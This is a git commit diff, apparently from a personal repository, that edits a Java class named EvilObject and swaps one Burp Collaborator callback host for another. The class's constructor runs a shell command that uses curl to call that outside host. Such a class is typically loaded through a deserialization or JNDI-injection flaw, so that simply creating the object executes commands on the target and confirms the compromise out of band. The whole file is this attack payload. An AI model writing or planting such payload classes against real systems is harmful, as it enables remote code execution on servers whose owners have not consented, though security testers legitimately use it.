1abd9165823b2b4e4ea50c3b5293283815cf1bc5
giuseppebattista <giuseppebattista92@gmail.com>
2021-09-24 16:45:15 +0200

    Add files via upload

--- EvilObject.java
+++ EvilObject.java
@@ -1,7 +1,7 @@
 public class EvilObject {
     public EvilObject() throws Exception {
         Runtime rt = Runtime.getRuntime();
-        String[] commands = {"/bin/sh", "-c", "curl https://sfbzov9ihxhj6w86zppcn3z9r0xqlf.burpcollaborator.net"};
+        String[] commands = {"/bin/sh", "-c", "curl http://vgf2pyali0im7z990sqfo60cs3y0mp.burpcollaborator.net"};
         Process pc = rt.exec(commands);
         pc.waitFor();
     }
